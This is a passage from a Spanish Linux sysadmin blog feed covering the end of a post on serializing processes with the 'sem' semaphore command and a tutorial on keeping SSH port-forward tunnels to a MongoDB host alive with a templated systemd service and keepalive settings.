&lt;p&gt;Esto indica que el comando &lt;em&gt;sem&lt;/em&gt; se va a bloquear si ya hay otro proceso en marcha para el semáforo indicado con el &lt;em&gt;flag --id&lt;/em&gt;. El parámetro &lt;em&gt;-j&lt;/em&gt; indica el número de procesos que pueden pasar a la vez, que en este caso, es uno solo. Cuando no haya nada ejecutando en el semáforo, otro proceso podrá pasar a ejecutar un comando, que en este caso es el &lt;em&gt;script&lt;/em&gt; anterior, con el mismo parámetro identificativo.&lt;/p&gt;
&lt;p&gt;Vemos que si no hay competencia en el mismo semáforo, no nos ralentiza nada. De hecho, los semáforos con distinto identificador son independientes, y no interfieren entre ellos, aunque en este ejemplo solo usemos uno.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@helium:~# ./protected_do_stuff.sh &lt;span class="m"&gt;1&lt;/span&gt;
&lt;span class="m"&gt;14&lt;/span&gt;:30:50 - Semaphore &lt;span class="k"&gt;for&lt;/span&gt; process &lt;span class="m"&gt;1&lt;/span&gt;
&lt;span class="m"&gt;14&lt;/span&gt;:30:50 - Started process &lt;span class="m"&gt;1&lt;/span&gt;
&lt;span class="m"&gt;14&lt;/span&gt;:31:00 - Ended process &lt;span class="m"&gt;1&lt;/span&gt;
root@helium:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Supongamos ahora que se lanza dos veces el mismo &lt;em&gt;script&lt;/em&gt;, con dos identificadores diferentes y con unos pocos segundos de diferencia. Los siguientes comandos se han lanzado desde dos sesiones de terminal distintas, ya que el proceso corre en primer plano.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@helium:~# ./protected_do_stuff.sh &lt;span class="m"&gt;1&lt;/span&gt;
&lt;span class="m"&gt;14&lt;/span&gt;:35:46 - Semaphore &lt;span class="k"&gt;for&lt;/span&gt; process &lt;span class="m"&gt;1&lt;/span&gt;
&lt;span class="m"&gt;14&lt;/span&gt;:35:47 - Started process &lt;span class="m"&gt;1&lt;/span&gt;
&lt;span class="m"&gt;14&lt;/span&gt;:35:57 - Ended process &lt;span class="m"&gt;1&lt;/span&gt;
root@helium:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Esperamos unos segundos y lanzamos el otro:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@helium:~# ./protected_do_stuff.sh &lt;span class="m"&gt;2&lt;/span&gt;
&lt;span class="m"&gt;14&lt;/span&gt;:35:50 - Semaphore &lt;span class="k"&gt;for&lt;/span&gt; process &lt;span class="m"&gt;2&lt;/span&gt;
&lt;span class="m"&gt;14&lt;/span&gt;:35:58 - Started process &lt;span class="m"&gt;2&lt;/span&gt;
&lt;span class="m"&gt;14&lt;/span&gt;:36:08 - Ended process &lt;span class="m"&gt;2&lt;/span&gt;
root@helium:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El primer proceso ha topado con el semáforo y ha empezado sin problemas en el mismo instante, aunque sin microsegundos no parece tan inmediato. Unos 4 segundos después se ha lanzado el otro comando, que ha tenido que esperar a que el primero acabara, antes de empezar. Esto se ve mejor si mezclamos las trazas de evento:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="mi"&gt;14&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;35&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;46&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;Semaphore&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;process&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
&lt;span class="mi"&gt;14&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;35&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;47&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;Started&lt;/span&gt; &lt;span class="n"&gt;process&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
&lt;span class="mi"&gt;14&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;35&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;50&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;Semaphore&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;process&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;
&lt;span class="mi"&gt;14&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;35&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;57&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;Ended&lt;/span&gt; &lt;span class="n"&gt;process&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
&lt;span class="mi"&gt;14&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;35&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;58&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;Started&lt;/span&gt; &lt;span class="n"&gt;process&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;
&lt;span class="mi"&gt;14&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;36&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;08&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;Ended&lt;/span&gt; &lt;span class="n"&gt;process&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En este caso se ve claramente que el proceso 2 queda parado en el semáforo hasta que el proceso 1 acaba, momento en el que puede empezar. Estoy seguro que esto tendrá muchas aplicaciones futuras.&lt;/p&gt;</content><category term="linux"></category><category term="semáforo"></category><category term="concurrencia"></category></entry><entry><title>Levantando túneles SSH con systemd</title><link href="https://www.linuxsysadmin.ml/2016/11/levantando-tuneles-ssh-con-systemd.html" rel="alternate"></link><published>2016-11-14T08:00:00+01:00</published><updated>2016-11-14T08:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-11-14:/2016/11/levantando-tuneles-ssh-con-systemd.html</id><summary type="html">&lt;p&gt;Ya vimos en un &lt;a href="https://www.linuxsysadmin.ml/2016/10/creando-tuneles-con-ssh.html"&gt;artículo anterior&lt;/a&gt; como levantar túneles &lt;strong&gt;SSH&lt;/strong&gt; para llegar a través del protocolo &lt;strong&gt;SSH&lt;/strong&gt;, a destinos que no están alcanzables normalmente. Esto está muy bien para aplicaciones puntuales, pero si tenemos que usar esos túneles una temporada, y deseamos que se mantengan levantados, ya es mas difícil …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Ya vimos en un &lt;a href="https://www.linuxsysadmin.ml/2016/10/creando-tuneles-con-ssh.html"&gt;artículo anterior&lt;/a&gt; como levantar túneles &lt;strong&gt;SSH&lt;/strong&gt; para llegar a través del protocolo &lt;strong&gt;SSH&lt;/strong&gt;, a destinos que no están alcanzables normalmente. Esto está muy bien para aplicaciones puntuales, pero si tenemos que usar esos túneles una temporada, y deseamos que se mantengan levantados, ya es mas difícil.&lt;/p&gt;
&lt;p&gt;Hay miles de gestores de procesos que pueden hacer este trabajo por nosotros, como &lt;strong&gt;runit&lt;/strong&gt;, &lt;strong&gt;monit&lt;/strong&gt;, &lt;strong&gt;supervisor&lt;/strong&gt; entre otros. Personalmente no soy fan de instalar nada que proporcione una funcionalidad duplicada, así que... ¿por que no &lt;strong&gt;systemd&lt;/strong&gt;?&lt;/p&gt;
&lt;p&gt;Para este tutorial vamos a suponer que tenemos acceso a un servidor intermedio con &lt;strong&gt;SSH&lt;/strong&gt;, que ve a un servidor de bases de datos, y a través del que vamos a hacer el salto. Respectivamente, los vamos a llamar &lt;em&gt;jump&lt;/em&gt; y &lt;em&gt;database&lt;/em&gt;, en una explosión de creatividad.&lt;/p&gt;
&lt;h2&gt;El túnel básico&lt;/h2&gt;
&lt;p&gt;Lo primero es darnos cuenta que no llegamos a la base de datos; no importa que intentemos conectar a &lt;em&gt;localhost&lt;/em&gt; o a &lt;em&gt;database&lt;/em&gt; directamente. No llegamos y punto.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~$ mongo
MongoDB shell version: &lt;span class="m"&gt;3&lt;/span&gt;.2.10
connecting to: &lt;span class="nb"&gt;test&lt;/span&gt;
&lt;span class="m"&gt;2016&lt;/span&gt;-10-17T15:39:25.766+0200 W NETWORK  &lt;span class="o"&gt;[&lt;/span&gt;thread1&lt;span class="o"&gt;]&lt;/span&gt; Failed to connect to &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1:27017, reason: errno:111 Connection refused
&lt;span class="m"&gt;2016&lt;/span&gt;-10-17T15:39:25.766+0200 E QUERY    &lt;span class="o"&gt;[&lt;/span&gt;thread1&lt;span class="o"&gt;]&lt;/span&gt; Error: couldn&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;t connect to server &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1:27017, connection attempt failed :
connect@src/mongo/shell/mongo.js:229:14
@&lt;span class="o"&gt;(&lt;/span&gt;connect&lt;span class="o"&gt;)&lt;/span&gt;:1:6

exception: connect failed
gerard@aldebaran:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos a levantar un túnel &lt;strong&gt;SSH&lt;/strong&gt; que muestre en el puerto local 27017 el destino &lt;em&gt;database&lt;/em&gt;, al puerto 27017, tal como lo ve el servidor de salto.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~$ ssh -L &lt;span class="m"&gt;27017&lt;/span&gt;:database:27017 jump@jump -N
Warning: Permanently added &lt;span class="s1"&gt;&amp;#39;jump&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;ECDSA&lt;span class="o"&gt;)&lt;/span&gt; to the list of known hosts.
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Es especialmente importante que pongamos autenticación por claves, de forma que no nos pida la contraseña para levantar el túnel. Ahora no es un gran problema, pero si pretendemos que lo haga &lt;strong&gt;systemd&lt;/strong&gt;, no podemos instruirle a poner una contraseña dada.&lt;/p&gt;
&lt;p&gt;Ahora podemos comprobar que si llegamos a la base de datos, en nuestro puerto local:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~$ mongo
MongoDB shell version: &lt;span class="m"&gt;3&lt;/span&gt;.2.10
connecting to: &lt;span class="nb"&gt;test&lt;/span&gt;
Server has startup warnings: 
&lt;span class="m"&gt;2016&lt;/span&gt;-10-17T13:29:27.640+0000 I CONTROL  &lt;span class="o"&gt;[&lt;/span&gt;initandlisten&lt;span class="o"&gt;]&lt;/span&gt; 
&lt;span class="m"&gt;2016&lt;/span&gt;-10-17T13:29:27.640+0000 I CONTROL  &lt;span class="o"&gt;[&lt;/span&gt;initandlisten&lt;span class="o"&gt;]&lt;/span&gt; ** WARNING: /sys/kernel/mm/transparent_hugepage/defrag is &lt;span class="s1"&gt;&amp;#39;always&amp;#39;&lt;/span&gt;.
&lt;span class="m"&gt;2016&lt;/span&gt;-10-17T13:29:27.640+0000 I CONTROL  &lt;span class="o"&gt;[&lt;/span&gt;initandlisten&lt;span class="o"&gt;]&lt;/span&gt; **        We suggest setting it to &lt;span class="s1"&gt;&amp;#39;never&amp;#39;&lt;/span&gt;
&lt;span class="m"&gt;2016&lt;/span&gt;-10-17T13:29:27.640+0000 I CONTROL  &lt;span class="o"&gt;[&lt;/span&gt;initandlisten&lt;span class="o"&gt;]&lt;/span&gt; 
&amp;gt; db.serverBuildInfo&lt;span class="o"&gt;()&lt;/span&gt;
&lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;version&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;3.2.10&amp;quot;&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;gitVersion&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;79d9b3ab5ce20f51c272b4411202710a082d0317&amp;quot;&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;modules&amp;quot;&lt;/span&gt; : &lt;span class="o"&gt;[&lt;/span&gt; &lt;span class="o"&gt;]&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;allocator&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;tcmalloc&amp;quot;&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;javascriptEngine&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;mozjs&amp;quot;&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;sysInfo&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;deprecated&amp;quot;&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;versionArray&amp;quot;&lt;/span&gt; : &lt;span class="o"&gt;[&lt;/span&gt;
        &lt;span class="m"&gt;3&lt;/span&gt;,
        &lt;span class="m"&gt;2&lt;/span&gt;,
        &lt;span class="m"&gt;10&lt;/span&gt;,
        &lt;span class="m"&gt;0&lt;/span&gt;
    &lt;span class="o"&gt;]&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;openssl&amp;quot;&lt;/span&gt; : &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="s2"&gt;&amp;quot;running&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;OpenSSL 1.0.1t  3 May 2016&amp;quot;&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;compiled&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;OpenSSL 1.0.1t  3 May 2016&amp;quot;&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;buildEnvironment&amp;quot;&lt;/span&gt; : &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="s2"&gt;&amp;quot;distmod&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;debian81&amp;quot;&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;distarch&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;x86_64&amp;quot;&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;cc&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;/opt/mongodbtoolchain/bin/gcc: gcc (GCC) 4.8.2&amp;quot;&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;ccflags&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;-fno-omit-frame-pointer -fPIC -fno-strict-aliasing -ggdb -pthread -Wall -Wsign-compare -Wno-unknown-pragmas -Winvalid-pch -Werror -O2 -Wno-unused-local-typedefs -Wno-unused-function -Wno-deprecated-declarations -Wno-unused-but-set-variable -Wno-missing-braces -fno-builtin-memcmp&amp;quot;&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;cxx&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;/opt/mongodbtoolchain/bin/g++: g++ (GCC) 4.8.2&amp;quot;&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;cxxflags&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;-Wnon-virtual-dtor -Woverloaded-virtual -Wno-maybe-uninitialized -std=c++11&amp;quot;&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;linkflags&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;-fPIC -pthread -Wl,-z,now -rdynamic -fuse-ld=gold -Wl,-z,noexecstack -Wl,--warn-execstack&amp;quot;&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;target_arch&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;x86_64&amp;quot;&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;target_os&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;linux&amp;quot;&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;bits&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;64&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;debug&amp;quot;&lt;/span&gt; : false,
    &lt;span class="s2"&gt;&amp;quot;maxBsonObjectSize&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;16777216&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;storageEngines&amp;quot;&lt;/span&gt; : &lt;span class="o"&gt;[&lt;/span&gt;
        &lt;span class="s2"&gt;&amp;quot;devnull&amp;quot;&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;ephemeralForTest&amp;quot;&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;mmapv1&amp;quot;&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;wiredTiger&amp;quot;&lt;/span&gt;
    &lt;span class="o"&gt;]&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;ok&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;1&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
&amp;gt; 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Añadiendo systemd a la ecuación&lt;/h2&gt;
&lt;p&gt;Vamos a escribir nuestro propio &lt;em&gt;service&lt;/em&gt; de &lt;strong&gt;systemd&lt;/strong&gt;. Para ello, vamos a seguir &lt;a href="https://www.linuxsysadmin.ml/2015/11/escribiendo-units-en-systemd.html"&gt;otro artículo&lt;/a&gt;. Solo por la posibilidad de tener que levantar varios túneles, vale la pena usar las plantillas. Como solo podemos pasar un parámetro al &lt;em&gt;service&lt;/em&gt;, vamos a crear un &lt;em&gt;script&lt;/em&gt; que nos permita elegir los parámetros del túnel en función de una palabra clave.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~$ cat /home/gerard/bin/tunnel_to.sh 
&lt;span class="c1"&gt;#!/bin/bash&lt;/span&gt;

&lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$1&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; in
  database&lt;span class="o"&gt;)&lt;/span&gt; ssh -L &lt;span class="m"&gt;27017&lt;/span&gt;:database:27017 jump@localhost -N &lt;span class="p"&gt;;;&lt;/span&gt;
&lt;span class="k"&gt;esac&lt;/span&gt;
gerard@aldebaran:~/docker/systemd-tunnel$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y le damos permisos de ejecución.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/systemd-tunnel$ chmod +x /home/gerard/bin/tunnel_to.sh 
gerard@aldebaran:~/docker/systemd-tunnel$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;De momento tenemos el mismo túnel, pero simplificado a un &lt;em&gt;script&lt;/em&gt; con un solo parámetro:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~$ tunnel_to.sh database
Warning: Permanently added &lt;span class="s1"&gt;&amp;#39;localhost&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;ECDSA&lt;span class="o"&gt;)&lt;/span&gt; to the list of known hosts.
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos a trabajar en las carpetas de sistema de &lt;strong&gt;systemd&lt;/strong&gt;, en donde se supone que, por convención, debemos dejar nuestras &lt;em&gt;units&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@aldebaran:~# &lt;span class="nb"&gt;cd&lt;/span&gt; /etc/systemd/system/
root@aldebaran:/etc/systemd/system# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Siguiendo el citado artículo, creamos la plantilla base que va a invocar el &lt;em&gt;script&lt;/em&gt; de los túneles, con el parámetro que le demos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@aldebaran:/etc/systemd/system# cat tunnel&lt;span class="se"&gt;\@&lt;/span&gt;.service 
&lt;span class="o"&gt;[&lt;/span&gt;Unit&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;Description&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;SSH Tunnel

&lt;span class="o"&gt;[&lt;/span&gt;Service&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;User&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;gerard
&lt;span class="nv"&gt;ExecStart&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/home/gerard/bin/tunnel_to.sh %i
&lt;span class="nv"&gt;Restart&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;always

&lt;span class="o"&gt;[&lt;/span&gt;Install&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;WantedBy&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;multi-user.target
root@aldebaran:/etc/systemd/system# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Creamos un &lt;em&gt;soft link&lt;/em&gt; para cada uno de los túneles que queramos levantar:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@aldebaran:/etc/systemd/system# ls -lh tunnel*
lrwxrwxrwx &lt;span class="m"&gt;1&lt;/span&gt; root root  &lt;span class="m"&gt;15&lt;/span&gt; oct &lt;span class="m"&gt;17&lt;/span&gt; &lt;span class="m"&gt;15&lt;/span&gt;:43 tunnel@database.service -&amp;gt; tunnel@.service
-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; root root &lt;span class="m"&gt;134&lt;/span&gt; oct &lt;span class="m"&gt;17&lt;/span&gt; &lt;span class="m"&gt;15&lt;/span&gt;:43 tunnel@.service
root@aldebaran:/etc/systemd/system# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;De esta forma, el servicio &lt;em&gt;tunnel@database&lt;/em&gt; va a levantar el &lt;em&gt;script&lt;/em&gt; con el parámetro &lt;em&gt;database&lt;/em&gt;, que a su vez, va a levantar el túnel como le hayamos indicado. Activamos el servicio para futuros reinicios de la máquina, y lo levantamos para esta sesión.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@aldebaran:/etc/systemd/system# systemctl &lt;span class="nb"&gt;enable&lt;/span&gt; tunnel@database
Created symlink from /etc/systemd/system/multi-user.target.wants/tunnel@database.service to /etc/systemd/system/tunnel@.service.
root@aldebaran:/etc/systemd/system# systemctl start tunnel@database
root@aldebaran:/etc/systemd/system# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y ya podemos comprobar como el túnel está levantado, sea mediante la inspección de los procesos en &lt;em&gt;runtime&lt;/em&gt; o directamente accediendo a la base de datos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~$ mongo
MongoDB shell version: &lt;span class="m"&gt;3&lt;/span&gt;.2.10
connecting to: &lt;span class="nb"&gt;test&lt;/span&gt;
Server has startup warnings: 
&lt;span class="m"&gt;2016&lt;/span&gt;-10-17T13:29:27.640+0000 I CONTROL  &lt;span class="o"&gt;[&lt;/span&gt;initandlisten&lt;span class="o"&gt;]&lt;/span&gt; 
&lt;span class="m"&gt;2016&lt;/span&gt;-10-17T13:29:27.640+0000 I CONTROL  &lt;span class="o"&gt;[&lt;/span&gt;initandlisten&lt;span class="o"&gt;]&lt;/span&gt; ** WARNING: /sys/kernel/mm/transparent_hugepage/defrag is &lt;span class="s1"&gt;&amp;#39;always&amp;#39;&lt;/span&gt;.
&lt;span class="m"&gt;2016&lt;/span&gt;-10-17T13:29:27.640+0000 I CONTROL  &lt;span class="o"&gt;[&lt;/span&gt;initandlisten&lt;span class="o"&gt;]&lt;/span&gt; **        We suggest setting it to &lt;span class="s1"&gt;&amp;#39;never&amp;#39;&lt;/span&gt;
&lt;span class="m"&gt;2016&lt;/span&gt;-10-17T13:29:27.640+0000 I CONTROL  &lt;span class="o"&gt;[&lt;/span&gt;initandlisten&lt;span class="o"&gt;]&lt;/span&gt; 
&amp;gt; &lt;span class="nb"&gt;exit&lt;/span&gt;
bye
gerard@aldebaran:~$ ps faux &lt;span class="p"&gt;|&lt;/span&gt; grep database &lt;span class="p"&gt;|&lt;/span&gt; grep -v grep
gerard   &lt;span class="m"&gt;22679&lt;/span&gt;  &lt;span class="m"&gt;0&lt;/span&gt;.0  &lt;span class="m"&gt;0&lt;/span&gt;.0  &lt;span class="m"&gt;13228&lt;/span&gt;  &lt;span class="m"&gt;2632&lt;/span&gt; ?        Ss   &lt;span class="m"&gt;15&lt;/span&gt;:46   &lt;span class="m"&gt;0&lt;/span&gt;:00 /bin/bash /home/gerard/bin/tunnel_to.sh database
gerard   &lt;span class="m"&gt;22680&lt;/span&gt;  &lt;span class="m"&gt;0&lt;/span&gt;.0  &lt;span class="m"&gt;0&lt;/span&gt;.0  &lt;span class="m"&gt;44428&lt;/span&gt;  &lt;span class="m"&gt;5320&lt;/span&gt; ?        S    &lt;span class="m"&gt;15&lt;/span&gt;:46   &lt;span class="m"&gt;0&lt;/span&gt;:00  &lt;span class="se"&gt;\_&lt;/span&gt; ssh -L &lt;span class="m"&gt;27017&lt;/span&gt;:database:27017 jump@localhost -N
gerard@aldebaran:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Solo nos queda comprobar que si matamos el proceso, simulando que se cae solo, &lt;strong&gt;systemd&lt;/strong&gt; se encarga de levantarlo de nuevo, en honor a la directiva &lt;em&gt;reload=always&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~$ &lt;span class="nb"&gt;kill&lt;/span&gt; &lt;span class="m"&gt;22679&lt;/span&gt;
gerard@aldebaran:~$ ps faux &lt;span class="p"&gt;|&lt;/span&gt; grep database &lt;span class="p"&gt;|&lt;/span&gt; grep -v grep
gerard@aldebaran:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y antes de que podamos siquiera repetir el comando &lt;em&gt;ps&lt;/em&gt;, ya lo tenemos de nuevo en marcha:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~$ ps faux &lt;span class="p"&gt;|&lt;/span&gt; grep database &lt;span class="p"&gt;|&lt;/span&gt; grep -v grep
gerard   &lt;span class="m"&gt;22854&lt;/span&gt;  &lt;span class="m"&gt;0&lt;/span&gt;.0  &lt;span class="m"&gt;0&lt;/span&gt;.0  &lt;span class="m"&gt;13228&lt;/span&gt;  &lt;span class="m"&gt;2632&lt;/span&gt; ?        Ss   &lt;span class="m"&gt;15&lt;/span&gt;:49   &lt;span class="m"&gt;0&lt;/span&gt;:00 /bin/bash /home/gerard/bin/tunnel_to.sh database
gerard   &lt;span class="m"&gt;22855&lt;/span&gt;  &lt;span class="m"&gt;0&lt;/span&gt;.0  &lt;span class="m"&gt;0&lt;/span&gt;.0  &lt;span class="m"&gt;44428&lt;/span&gt;  &lt;span class="m"&gt;5200&lt;/span&gt; ?        S    &lt;span class="m"&gt;15&lt;/span&gt;:49   &lt;span class="m"&gt;0&lt;/span&gt;:00  &lt;span class="se"&gt;\_&lt;/span&gt; ssh -L &lt;span class="m"&gt;27017&lt;/span&gt;:database:27017 jump@localhost -N
gerard@aldebaran:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;TRUCO&lt;/strong&gt;: A pesar de que nuestro túnel pueda estar vivo, algunos servidores están configurados para cerrar conexiones que llevan mucho tiempo de inactividad. Podemos generar tráfico de &lt;em&gt;keepalive&lt;/em&gt; para que esto no suceda, con una simple directiva &lt;strong&gt;SSH&lt;/strong&gt; cliente. Por ejemplo, la podemos poner en la configuración local del usuario que levante los túneles.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~$ cat .ssh/config 
...
Host *
    ServerAliveInterval &lt;span class="m"&gt;60&lt;/span&gt;
...
gerard@aldebaran:~$ 
